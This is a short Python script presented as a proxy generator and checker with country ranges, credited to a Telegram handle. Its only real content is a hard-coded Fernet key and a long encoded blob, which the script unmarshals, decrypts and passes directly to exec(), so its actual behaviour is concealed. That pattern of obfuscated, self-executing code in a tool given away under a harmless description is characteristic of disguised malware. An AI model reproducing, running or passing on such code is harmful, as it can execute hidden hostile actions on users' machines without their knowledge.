#PROXY AUTO GEN + COUNTRY RANGE + CHECK
#dev- @temuworkerhere on TG
from cryptography.fernet import Fernet
import base64
import marshal

key = b'IcGp8aNLz1MBw3tcl_l2EfC4acSMdBHgWK3Avis_OzI='

cipher = Fernet(key)

encoded_encrypted_data = b'\xf3\x10\x17\x00\x00Z0FBQUFBQm5QTUdBTFhtWjRVTWpickVIVzlLWnZIZ3g4OUQ3d3NkY0IyUDdqSURsS3JKMDJwR1ZicGl1OURJazhqX1ExYURDUS1HVXRXU0E4cF9qeW1sUTJUN21oMzRmRXpoVExId1phcG9SQm9TZUNZc3JvSVJXaDgyTWZaWjNGMlBjdVhBTmNDN0h4NVVPQ3ViSFNYR2NwZFNJc3JmV2xaUF9lbzVDcnh3a25Mc0FnUTl6cl9EbjM5cjRlSTR1VWo4aGhMSHFhT19GXzBNbEpjZ3hiMm9jQVVodHQyaXQ5NGpTQUlaUWVKamtaUFFUVm50NldyZGlKOE5DLUNlTW5CM0t6ZHhRdHRZU0lYZWNfODcxNnFEcmg1M1lwR3FUcHB2WUhEeTU0dU95XzQwa0ZIYi1RQzNkWUlqb0hNQVJxdXVVdEhsR01yRExQM1lMRHZXRC15Q3E5TUtWU2pmd3ZaSkhLc2poMlJMS29SdDh6WVNqOHROU2ZFV05YY0tfTDlIeEp2NmZ2Nm5SUDZPTHAzbmZFaWRqZXJyVlBLNld0azV5RDhZb043eWkzSGhvdXl4UFVZTjdzOUt0b3VvV3ZFZERMUnRmaVZmeHFaNFk1MmktZlljTFA5MC1rYnprNlQ4Vmc4V3U2Vy00LUlka2M2UzY0VFQ5UldlVHZMeWszeHB1REFtSTdoUmZzUXRiX2h5WmlXZFZyR0Z5UGZXX2V3OEItbjN5Vms3aVZwZ09qNllpUE5vMFEwQ1RFdW9qeUlGNnlPb052OTdSUFRDWEt5V3NzVnVlaW1rLVhGYnZHS3AxSDA3cG5aMnBhcHo0ZFk5Z0dZLXdLVVBQVW5Bcmhvb1lJUWc1TE1LS210THJzLXN6SFFzQUZPXzV3clBlVHI3UVI0WV9lQmtwd0N3Yi1IRlUxU19xZWc3ejdlNFVyXzFYaFB6S3BPX3BTdzkzb3c3OFNVUFRNODhHbTlMQnZiNVBpa0gxV0JHMlFFckQxM1Jfc2F6X3czOXBqQkFIdjFuMTFJUlQ5WE5EcE9Ydk1pU0E5dFZDOUlhN1JHbUwybGtxeUF3Q0JoUllKYWxaWkxZNjNhYzVxMm42blloQmJHUC13dUYxXzE0NnpQMnc0LXM2VTVETEo0VjhqOVJweV9kdHBVRnVDOWdXYWNiOEVaa2VpVzROWlVIZTMxZE5uVzF2NVNzRUdkVjFFczE0eTA1YXFZb3R5b2w1ZjFjZExvanFyaEZSWFQteDRteE9wbHZ5Z0poUkJXQ21DRmh5ZmpJWEY1Y3JUVnlsQ3NjSkF4QkNUNFVEbURtRWlUWFVGdlhnbXVzVXYxRlBrZFdSTmdyWC1jcFd3T3BUVzNUaVVDejMwNVZBbEozeDVka2tjOVBKblFsR0RZWmI2a1M5bjdUWXlrejRmQXp6b0dLQ1hrYlNCZVNwTGxVWkdscWI4b1g3ajd2NlNWWVJ5eEdRdFNqZi1iblVKNHRJV2ZQTERJTWx1Um9Cb0N6SnhheHA0YVRubFpUU1BFSWJhSm9IR0FwS2NDQVU5eU1hOXhFVV80aDBZMU9oVVJNX2RFWFVJZjlSOFZ3c0tjcG5GUkV3aGY4ak9VN0dmTHZ5UEQ5aENpTFlYQy1aaVZiS1E1Z3lpWHRfWlpzS0p3ejZvaXc4bWZtWjlsbURTMUtyeWRMUV9wTm5FRndFckZ5cVk3UnkwQjZPUDd0WV93RGdPYnFPNnBlSkhaY1ZTQWo4LWd6bUcwTXB4MVV4R0hXVG9HTWpXQzd1ek5fbW1nU29jQVRxWXBlRFdjemxpZDZ2YjY1MklTcWl4Z3dRMGZSWjZrRVphZ0o4Z09UdVR3d2JFUGcxNzFiVGxsUUkzUXphRFFrMnJtRFFQVjZMb1d4aVp2d0kzeGdpWnZhaXNIeFNvTmxuSDl3MWZHdEVWc1dzQnNPNHdNYVdYMl9zTHNxQ2lwVkZGaDhqV1Y5NFllckgzUTBGeUp2S3dha2puZFJocHptVlN3eW56MWhyMEhxbWJ5T2xSaFZoTG9GekJuOWVQTlBSU3J1MlFLX24wcWxXa2dtc3BjT2p2MHg0a0xfenpMT2lCUUk0NTN3QUtJUFFMMl81dm41eGJJNTFPd0hiUlFmcDUyUlBzSHp5UUdmekRma2Q4b3FURmUtb19OVlpFUFQ3RkVtemp4RjhqcmNycUtST01rVmpyQks5NkMtdnlab0pnam43cHZ4d3p6bUNuaWM1NFlOWEpqRC0zNm9CYndjdENmUmpkZmV4a0dCMUFIVlN6M1dwWDNDdWRYbG5GajV0VnNuNTNXZERjdUh6VTVHVGNva2xLVzhTSUx6UnVUOERxS0ZuZHgyeVQ1MWFpZ3JoMGFJVzE3LXlPOGJlWnVwUThDTG12Z04wdmVHNnZPd29vNVlYOWgzaDFhejhidEpTT0czWkY1STVwMXpmUzJ2UHF2YlhnZ1RlanNMTWV4SE9sMDNNSGVfb1ZwZGFRdWhjeDlTZk1UbHY0RHVWRHh1YVp3NTE4ZW9rSGk3OWhkWWNqbFhidnpubWdvVnhCbVZ1b3ZBMnpObFBTNnUxVnJ4ajNBWDZheG1ySlJzVGFORzFudDl1bGxaa040UVpmWEdiVmNRTmw3Q3p6eTFwMmVTRjdqaDdMbGwwbjdnbm9nZzNzZXlKcHNhRXlvYXJId19TNjk0bVFtN0VZcFNMc2Q0UWNYcXJwWHprS2hsVEhkM2NINUR5RFYxbnA4d2JGSTRnY0p0UU1kdUFZNHlOTkNueTVLVGhqRG5tRUtWY2lHN3k0MldhSzZYbFhqNkhqalk0RHZISUlRWWQ4TUdWcDBlT0poMVRXMDkyV0o4dEIxTnNYWi1feXpMU1BXQW85UlVPWmpkaGYtelV3c0VkV21oWHFPWmxreTNZQVNZcFo0cERsQUFCWWxZTFAtQXYyd2NrR2REaEdSU1VscXEzdlNMV3RUck85RHBhMXVGRkRpU3l1MEpGVGsyOW9pR0RhcXpEQ0dDLWxET19OM0Vfc2VpemE0elhHVEx6c1NtOWhTX253QVNmamVuODVlZzhsUVdjRHBxcktHSFdCc1dIR3NLUW1GMll5ZlR3M3NmT2lLVmRHZWNHVlc1YURuRTM1UC1RdWRvZWwwNVIxZmlQU0xFNHlSRWZ4aUFjakpHR1doQlBvYXlNXzVoSGdqRlJBZGs1dXJHbHRLRTlmSXFZTl9LOFgyQnlmQTZKam5KVUZhV2x3dE1adEZPd3d3T21ieDktdDFQc0t6YXlSYWtmOGJ3bHdQUXRuMF9LaWlLWGdjS0xkX0hlYzl6dXJOMjlOenFpRENRVlp6Ql9oV2tnM1VObmlYcVpSN2U2OHBxVlY5ZHpLLXpMYnZQQ0lLT21FVXFqTWEtUFMwYURXcTRIcWdBbXB3WnZFMEVFQ1d1RkRDRVpRQmFpcDZQRXZJZEtDV0hTR3lkczlUQldkcGtXTHlhWXN5cG9JaVFjVVFwS25fQlVCTUFwRk8tNnpxQkhmaXVwWXhlTVR5UFowbEFQY0tfRXhYcTA1X3E1amJFNlhoeEpjM3lQc1MxNGZmOHdhbS1oY1p0VEtuZTY1SEM1UGlYSEZhelp3SnpiN2ZjdGttWmdjblpiTld6UWtHdDhZVGxNUVcxWVFVZHRDVUwwRWdfQm5uc1FZN2ZHcTEzR2ZfVm9TZldGVUhYV2pIczlpUzhFcW5Eak90MG9DX1NtWEFjRDdTWFA4R3pQTUQwZXpUd3BSdTVMOGw1MFA3UVJBWEkyY0hnakgtMm0yclpRUEllbWFwUTRyX1c4T0ZKTlpQWjJ5X29qanFVamZxMFNuNkZiZ1diUlZTNnJiaVZxdm1JenpaMEUwaFhxWFJ5OW1Bek01T1NBYkJvRmI0bUxTdU8wckxDYVFBd1hKaFhyZ0pUNlRrWlY3bm9pakN0TVNUWjNpcWZSdU5NT0dxb1k0cV82NnRZSmdxUVotMWktNnVyY3NFdFJVajY3M1ZSYktKS0k3d3k3MTVPWTBBbXhQR243S0dNOXhzdmNhd2wtUVV0SE1uOHJtZlk3M0FHSWxvbE9GQ3gyeE1rU0tHSlZncks5Z2hma0tjeXNFNk5sbHNCRTdvSXNLam9Ka2tFYXBBbFd4NVhCYUFFTmhFLTFqM1J0dFhlVXg0NnV4N0N6RVVzeVBTdUFRcE5NV0hjeDZYNlFvRVZkSWlfMmJBcjAzMmp3eV9pMHU4eVQteU1iS1JjWW9SNmg2dmx5cS1GVEJrU2lCZF9lWTRrNEFQbFFTcWFxOEluMHctLVR2REx6QWkxakdBNURWd3RJdTVJTUxHTUpLT2Zkakswa05fLVFwdGRtbE9JUjNpMHBIMW5tR0RiYV9xeXhFV2ZZSFQ0czNTSTRGOW9QMHV6dmg4N3RjRG15b01HV1BZMkNOQXM0VUsxLVJJS044aFNCd1ctcnlLY252emVnQ0EyVE9xR2JIc28wVWZhY0VwamVVX2dLZGJxdGNCOFBYSmExUWJRNkRQYmd6OXIyS3FVeXFnelBZdlRSWjRGLXJrclZpNndVUUIwSF9HT2FLR3otS3FaR2hqamhmZ3ZEcEpmRi03cGNvWHJPOHRlZ1hKdTJEX2xxam05SFBTVkRlNEZNZXV4ekRzSm9sSmwxZm81RHVnYTJlSEtUX09wWGFteGVKLTF5aTZGb0RyUEdSb3RHRW9CVERBZXRMVTNvSzZKR1JobmRVb2NzeEJKVzkzY2JIc3BRQ2dUZVpIT0kxU1JnYXlqbzNtcm1EM0Q1TFNkc2pyOFk3cjBmVWljUV9RZVhzYW9LdTN6WEloTzMwOENoX3RDcGwtMERaLU9QU0x6c1hUYk1GYXZsalVUa2RTY0Q1dUtjZHBWck13MDRSNUJjemxyS0t1ZV92SHBoa19JRl9YbHZfblVQaGZkcW90MnpFcWF4LVlTa3FsdVk4NHUzbWllcFVMUWU3Um5BLXVnOXlLUTE1WTRlMDgxSGM0SE9Bd0xtcXFNak9tdEJKZms2TE9tN2lLVDlXNUJRS19EaVJpTGtPei1kcWtFVlFabDJ6NTlyb0VoTkNWM2xnSDJBaTBtVVJhM01KYmZGMzVCaW9FTzJPbzFpczVQb2pxTzYydXpqMzZVZDBQMDNqLXhGTExhX0hTVnpoeElSQVJCSDNjSkpfYTltblBCWXZJWV9TbDhLQURUanRla29hRGdqc2I3YkRoeE8zYndQNlhxb3dFNzBZTjU0QzNCTW5YWnNyWmZDZ3prbVdPbUZjZE0zSVBEek9hM2lHQnZuVmhJRVdSTVE4dmFFaGtEQnhOdDNjTDVOSnA2Y3N2RGJMam8tZzFab1FoaERHQmhWVFVFWDZYOVQ3ZVpIWTcxdmJhdmNjQkV2Mlo2VzVmTllRd2FxU08yNkh1WlN5SXlFSVF2VG54STJJdV9mT1FyUVExbWsycDMtR09pM25DZmdFaTkwVHI4SE05QjJwN1RvTG1uN2diV1U4dGZad2MzRFVrTlBaSW94dzdpeEQwRmRHaVlzTHRXR01SYkpYRUViSVF2N19JYWVwU3JHMGRtNll2bXlJMzdSSkZQUEVPVkx2YmFycUFIUWFXZFluWlZkZE1acTZoVml0cWFSWDFkS0FfREI1WVJwSjhzbEhuZXN5Q2pScTNWWmdvVVAzbFRyM3VGX2hGeVpqejRrMGJsVGcxdFg0cU1sMml0c24xOTVBVUVqNG5fTHhZS05NU1RqVW1DTU54Z3BCc3BtUDBGc29sUmgta1NYbFhHRnpXTjlOcFN1dkRrcV9VdEpJNXVZZ0p3QjBxSmhpUzljZjlmNkswaXZwdHlySU9nWnVDdDUwMGRwLW42MkwyVUxYbnRoeTlEZWlRLTFFbExzcTBYVGRzWTVDM25Y'

encrypted_data = marshal.loads(encoded_encrypted_data)

decrypted_data = cipher.decrypt(base64.b64decode(encrypted_data))

exec(decrypted_data)
